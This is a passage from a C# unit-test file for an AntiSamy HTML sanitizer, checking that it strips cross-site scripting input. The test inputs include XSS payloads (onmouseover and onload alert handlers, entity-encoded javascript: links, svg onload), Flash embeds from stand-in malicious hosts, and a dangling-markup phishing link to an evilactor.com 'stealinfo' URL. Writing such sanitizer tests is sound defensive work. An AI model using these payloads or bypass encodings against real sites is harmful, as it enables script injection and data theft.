            input = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://supermaliciouscode.com/badstuff.swf\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\"></embed></object>";
            expectedOutput = "<object width=\"560\" height=\"340\"><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\" /></object>";
            antisamy.Scan(input, revised).GetCleanHtml().Should().Contain(expectedOutput);

            // Now what if someone sticks malicious URL in the value of the src attribute in the embed tag? remove that embed tag
            input = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://hereswhereikeepbadcode.com/ohnoscary.swf\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\"></embed></object>";
            expectedOutput = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /></object>";
            antisamy.Scan(input, revised).GetCleanHtml().Should().Contain(expectedOutput);
        }

        [Test]
        public void TestOnsiteRegex()
        {
            antisamy.Scan("<a href=\"foo\">X</a>", policy).GetCleanHtml().Should().Contain("href=\"");
            antisamy.Scan("<a href=\"/foo/bar\">X</a>", policy).GetCleanHtml().Should().Contain("href=\"");
            antisamy.Scan("<a href=\"../../di.cgi?foo&amp;3D~\">X</a>", policy).GetCleanHtml().Should().Contain("href=\"");
            antisamy.Scan("<a href=\"/foo/bar/1/sdf;jsessiond=1f1f12312_123123\">X</a>", policy).GetCleanHtml().Should().Contain("href=\"");
        }

        [Test(Description = "Tests issue #10 from nahsra/antisamy on GitHub.")]
        public void TestHtml5Colon()
        {
            antisamy.Scan("<a href=\"javascript&colon;alert&lpar;1&rpar;\">X</a>", policy).GetCleanHtml().Should().NotContain("javascript");
        }

        [Test(Description = "Tests issue #144 from owaspantisamy Google Code Archive.")]
        public void TestPinataString()
        {
            antisamy.Scan("pi\u00f1ata", policy).GetCleanHtml().Should().Be("pi\u00f1ata");
        }

        [Test]
        public void TestHtml5DynamicDataAttribute()
        {
            // Test good attribute "data-"
            antisamy.Scan("<p data-tag=\"abc123\">Hello World!</p>", policy).GetCleanHtml().Should().Be("<p data-tag=\"abc123\">Hello World!</p>");
            // Test bad attribute "dat-"
            antisamy.Scan("<p dat-tag=\"abc123\">Hello World!</p>", policy).GetCleanHtml().Should().Be("<p>Hello World!</p>");
        }

        [Test]
        public void TestXssOnMouseOver()
        {
            antisamy.Scan("<bogus>whatever</bogus><img src=\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\" onmouseover=\"alert('xss')\">", policy).GetCleanHtml()
                .Should().Be("whatever<img src=\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\" />");
        }

        [Test]
        public void TestObfuscationOnclickXssBypass()
        {
            antisamy.Scan("<a href=\"http://example.com\"&amp;/onclick=alert(9)>foo</a>", policy).GetCleanHtml()
                .Should().Be("<a href=\"http://example.com\" rel=\"nofollow\">foo</a>");
        }

        [Test(Description = "Tests issue #10 from nahsra/antisamy on GitHub.")]
        public void TestOnloadXssOnStyleTag()
        {
            antisamy.Scan("<style onload=alert(1)>h1 {color:red;}</style>", policy).GetCleanHtml().Should().NotContain("alert");
        }

        [Test]
        public void TestUnknownTags()
        {
            // Original comment: Mailing list user sent this in. Didn't work, but good test to leave in.
            antisamy.Scan("<%/onmouseover=prompt(1)>", policy).GetCleanHtml().Should().NotContain("<%/");
        }

        [Test]
        public void TestStreamScan()
        {
            const string testImgSrcUrl = "<img src=\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\" ";
            using var reader = new StreamReader(new MemoryStream(Encoding.UTF8.GetBytes($"<bogus>whatever</bogus>{testImgSrcUrl}onmouseover=\"alert('xss')\">")));
            using var writer = new StreamWriter(new MemoryStream());

            antisamy.Scan(reader, writer, policy).GetCleanHtml().Should().BeNull();

            using var resultReader = new StreamReader(writer.BaseStream);
            resultReader.ReadToEnd().Should().Be($"whatever{testImgSrcUrl}/>");
        }

        [Test(Description = "Tests issue #23 from nahsra/antisamy on GitHub.")]
        public void TestStrippingNestedLists()
        {
            const string html = "<ul><li>one</li><li>two</li><li>three<ul><li>a</li><li>b</li></ul></li></ul>";
            /* Issue claims you end up with this:
             *      <ul><li>one</li><li>two</li><li>three<ul></ul></li><li>a</li><li>b</li></ul>
             *      
             * Meaning the <li>a</li><li>b</li> elements were moved outside of the nested <ul> list they were in
             */

            // The replace is used to strip out all the whitespace in the clean HTML so we can successfully find what we expect to find
            antisamy.Scan(html, policy).GetCleanHtml().Replace("\\s", "").Should().Contain("<ul><li>a</li>");
        }

        [Test(Description = "Tests issue #24 from nahsra/antisamy on GitHub.")]
        [Ignore("This issue is a valid enhancement request planned to implement in the future. Now it is ignored to pass CI.")]
        public void TestOnUnknownTagEncodingBehaviorWithAtSymbol()
        {
            // If we have onUnknownTag set to "encode", it still strips out the @ and everything else after it.
            // DOM Parser actually rips out the entire <name@mail.com> value even with onUnknownTag set.
            Policy revised = policy.CloneWithDirective("onUnknownTag", Constants.ACTION_ENCODE);
            antisamy.Scan("firstname,lastname<name@mail.com>", revised).GetCleanHtml().Should().Contain("name@mail.com");
        }

        [Test(Description = "Tests issue #26 from nahsra/antisamy on GitHub.")]
        public void TestPotentialXssFalsePositive()
        {
            const string html = "&#x22;&#x3E;&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x61;&#x20;&#x6F;" +
                "&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3E;";
            // Issue claims you end up with this: ><img src=a onerror=alert(1)>
            antisamy.Scan(html, policy).GetCleanHtml().Should().NotContain("<img src=a onerror=alert(1)>");
            // But you actually end up with this: &quot;&gt;&lt;img src=a onerror=alert(1)&gt; -- Which is as expected
        }

        [Test(Description = "Tests issue #27 from nahsra/antisamy on GitHub.")]
        public void TestOutOfBoundsExceptionOnSimpleText()
        {
            // This test doesn't cause an OutOfBoundsException, as reported in this issue even though it replicates the test as described.
            antisamy.Scan("my &test", policy).GetCleanHtml().Should().Contain("test");
        }

        [Test(Description = "Tests issue #33 from nahsra/antisamy on GitHub.")]
        public void TestTrickyEncodingXssBypassTrial()
        {
            /* Issue claims you end up with this:
             *   javascript:x=alert and other similar problems (javascript&#00058x=alert,x%281%29) but you don't.
             *   So issue is a false positive and has been closed.
             */
            const string html = "<html>\n"
                + "<head>\n"
                + "  <title>Test</title>\n"
                + "</head>\n"
                + "<body>\n"
                + "  <h1>Tricky Encoding</h1>\n"
                + "  <h2>NOT Sanitized by AntiSamy</h2>\n"
                + "  <ol>\n"
                + "    <li><a href=\"javascript&#00058x=alert,x%281%29\">X&#00058;x</a></li>\n"
                + "    <li><a href=\"javascript&#00058y=alert,y%281%29\">X&#00058;y</a></li>\n"
                + "    <li><a href=\"javascript&#58x=alert,x%281%29\">X&#58;x</a></li>\n"
                + "    <li><a href=\"javascript&#58y=alert,y%281%29\">X&#58;y</a></li>\n"
                + "    <li><a href=\"javascript&#x0003Ax=alert,x%281%29\">X&#x0003A;x</a></li>\n"
                + "    <li><a href=\"javascript&#x0003Ay=alert,y%281%29\">X&#x0003A;y</a></li>\n"
                + "    <li><a href=\"javascript&#x3Ax=alert,x%281%29\">X&#x3A;x</a></li>\n"
                + "    <li><a href=\"javascript&#x3Ay=alert,y%281%29\">X&#x3A;y</a></li>\n"
                + "  </ol>\n"
                + "  <h1>Tricky Encoding with Ampersand Encoding</h1>\n"
                + "  <p>AntiSamy turns harmless payload into XSS by just decoding the encoded ampersands in the href attribute</a>\n"
                + "  <ol>\n"
                + "    <li><a href=\"javascript&amp;#x3Ax=alert,x%281%29\">X&amp;#x3A;x</a></li>\n"
                + "    <li><a href=\"javascript&AMP;#x3Ax=alert,x%281%29\">X&AMP;#x3A;x</a></li>\n"
                + "    <li><a href=\"javascript&#38;#x3Ax=alert,x%281%29\">X&#38;#x3A;x</a></li>\n"
                + "    <li><a href=\"javascript&#00038;#x3Ax=alert,x%281%29\">X&#00038;#x3A;x</a></li>\n"
                + "    <li><a href=\"javascript&#x26;#x3Ax=alert,x%281%29\">X&#x26;#x3A;x</a></li>\n"
                + "    <li><a href=\"javascript&#x00026;#x3Ax=alert,x%281%29\">X&#x00026;#x3A;x</a></li>\n"
                + "  </ol>\n"
                + "  <p><a href=\"javascript&#x3Ax=alert,x%281%29\">Original without ampersand encoding</a></p>\n"
                + "</body>\n"
                + "</html>";
            antisamy.Scan(html, policy).GetCleanHtml().Should().NotContain("javascript&#00058x=alert,x%281%29");
        }

        [Test(Description = "Tests issue #34 from nahsra/antisamy on GitHub.")]
        public void TestStripNonValidXmlCharacters()
        {
            // Issue indicates: "<div>Hello\\uD83D\\uDC95</div>" should be sanitized to: "<div>Hello</div>"
            antisamy.Scan("<div>Hello\uD83D\uDC95</div>", policy).GetCleanHtml().Should().Be("<div>Hello</div>");
            antisamy.Scan("\uD888", policy).GetCleanHtml().Should().BeEmpty();
        }

        [Test(Description = "Tests issue #40 from nahsra/antisamy on GitHub.")]
        public void TestCleaningSvgFalsePositive()
        {
            // Concern is that: <svg onload=alert(1)//  does not get cleansed.
            // Based on these test results, it does get cleaned so this issue is a false positive, so we closed it.
            const string html = "<html>\n"
                + "<head>\n"
                + "  <title>Test</title>\n"
                + "</head>\n"
                + "<body>\n"
                + "  <h1>Tricky Encoding</h1>\n"
                + "  <h2>NOT Sanitized by AntiSamy</h2>\n"
                + "  <ol>\n"
                + "    <li><h3>svg onload=alert follows:</h3><svg onload=alert(1)//</li>\n"
                + "  </ol>\n"
                + "</body>\n"
                + "</html>";

            antisamy.Scan(html, policy).GetCleanHtml().Should().NotContain("<svg onload=alert(1)//");
        }

        [Test(Description = "Tests issue #48 from nahsra/antisamy on GitHub.")]
        public void TestOnsiteUrlAttacks()
        {
            // Concern is that onsiteURL regex is not safe for URLs that start with //.
            // For example:  //evilactor.com?param=foo
            const string phishingAttempt = "<a href=\"//evilactor.com/stealinfo?a=xxx&b=xxx\"><span style=\"color:red;font-size:100px\">"
                + "You must click me</span></a>";
            // Output: <a rel="nofollow"><span style="color: red;font-size: 100.0px;">You must click me</span></a>
            antisamy.Scan(phishingAttempt, policy).GetCleanHtml().Should().NotContain("//evilactor.com/");

            // This ones never failed, they're just to prove a dangling markup attack on the following resulting HTML won't work.
            // Less probable case (steal more tags):
            const string danglingMarkup = "<div>User input: " +
                "<input type=\"text\" name=\"input\" value=\"\"><a href='//evilactor.com?" +
                "\"> all this info wants to be stolen with <i>danlging markup attack</i>" +
                " until a single quote to close is found'</div>";
            antisamy.Scan(danglingMarkup, policy).GetCleanHtml().Should().NotContain("//evilactor.com/");

            // More probable case (steal just an attribute):
            //      HTML before attack: <input type="text" name="input" value="" data-attribute-to-steal="some value">
            const string danglingMarkup2 = "<div>User input: " +
                    "<input type=\"text\" name=\"input\" value=\"\" data-attribute-to-steal=\"some value\">";
            antisamy.Scan(danglingMarkup2, policy).GetCleanHtml().Should().NotContain("//evilactor.com/");
        }

        [Test(Description = "Tests issue #62 from nahsra/antisamy on GitHub.")]
        public void TestProcessingInstructionRemoval()
        {
            antisamy.Scan("<div><?foo note=\"I am XML processing instruction. I wish to be excluded\" ?></div>", policy).GetCleanHtml().Should().Be("<div></div>");
            antisamy.Scan("<?xml-stylesheet type=\"text/css\" href=\"style.css\"?>", policy).GetCleanHtml().Should().BeEmpty();
            antisamy.Scan("|<?ai aaa", policy).GetCleanHtml().Should().Be("|");
            antisamy.Scan("<div>|<?ai aaa", policy).GetCleanHtml().Should().Be("<div>|</div>");
        }

        [Test]
        public void TestTagTruncation()
        {
            Policy revised = policy
                .MutateTag(new Tag("section", "validate", null))
                .MutateTag(new Tag("div", "truncate", null));

            antisamy.Scan("<section><div class='.divToTruncate'>Div only contains this text<span>Confirmed</span></div></section>", revised)
                .GetCleanHtml().Should().Be("<section><div>Div only contains this text</div></section>");
        }

        [Test(Description = "Tests issue #81 from nahsra/antisamy on GitHub.")]
        public void TestPreserveImportantOnCssProperty()
        {
            antisamy.Scan("<p style=\"color: red !important\">Some Text</p>", policy).GetCleanHtml().Should().Contain("!important");
        }

        [Test]
        public void TestEntityReferenceEncodedInHtmlAttribute()
        {
            antisamy.Scan("<p><a href=\"javascript&#00058x=1,%61%6c%65%72%74%28%22%62%6f%6f%6d%22%29\">xss</a></p>", policy).GetCleanHtml().Should().Contain("javascript&amp;#00058");
        }

        [Test(Description = "Tests issue #101 from nahsra/antisamy on GitHub.")]
        public void TestManySingificantFiguresAndExponentialValuesOnCss()
        {
            // Test that margin attribute is not removed when value has too much significant figures.
            // Current behavior is that decimals like 0.00001 are internally translated to 1E-05, this
            // is reflected on regex validation and actual output. The inconsistency is due to Batik CSS.
            antisamy.Scan("<p style=\"margin: 0.0001pt;\">Some text.</p>", policy).GetCleanHtml().Should().Contain("margin");
            antisamy.Scan("<p style=\"margin: 10000000pt;\">Some text.</p>", policy).GetCleanHtml().Should().Contain("margin");
            
            // When using exponential directly the "e" or "E" is internally considered as the start of
            // the dimension/unit type. This creates inconsistencies that make the regex validation fail or value gets deleted.
            antisamy.Scan("<p style=\"margin: 1.0E-04pt;\">Some text.</p>", policy).GetCleanHtml().Should().NotContain("margin");
            antisamy.Scan("<p style=\"margin: 1.0E+04pt;\">Some text.</p>", policy).GetCleanHtml().Should().NotContain("margin");
        }

        [Test]
        public void TestCSSUnits()
        {
            string input = "<div style=\"width:50vw;height:50vh;padding:1rpc;\">\n" +
                "\t<p style=\"font-size:1.5ex;padding-left:1rem;padding-top:16px;\">Some text.</p>\n" +
                "</div>";
            antisamy.Scan(input, policy).GetCleanHtml().Should().ContainAll("ex", "px", "rem", "vw", "vh").And.NotContain("rpc");
        }
    }
}
